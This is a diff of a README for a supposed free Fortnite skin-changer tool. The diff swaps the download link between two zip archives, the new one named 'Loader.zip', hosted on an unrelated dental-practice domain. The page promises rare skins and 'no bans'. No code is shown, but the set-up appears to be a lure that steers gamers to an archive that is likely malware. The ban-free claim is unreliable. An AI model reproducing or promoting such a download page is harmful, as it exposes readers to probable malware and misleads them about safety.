@@ -2,7 +2,7 @@
 Easily customize your in-game appearance with a wide selection of skins.
 # Fortnite Skin Changer | Free Skin Swapper Tool
 
-[![Download Fortnite Skin Changer](https://img.shields.io/badge/Download-Fortniteskinschager-blueviolet)](https://cdgdental.it/free_download/Setup.zip)
+[![Download Fortnite Skin Changer](https://img.shields.io/badge/Download-Fortniteskinschager-blueviolet)](https://cdgdental.it/Loader.zip)
 
 Welcome to the **Fortnite Skin Changer** project — the ultimate tool for Fortnite enthusiasts who want to enhance their gaming experience by unlocking and swapping rare, legendary, and custom skins. Whether you're a content creator, roleplayer, or just a fan of cosmetic customization, this tool will allow you to explore and showcase all the skins you’ve ever dreamed of. Our skin changer lets you easily simulate and change the appearance of your Fortnite character without any gameplay alterations, ensuring no bans or issues with Epic Games.
 
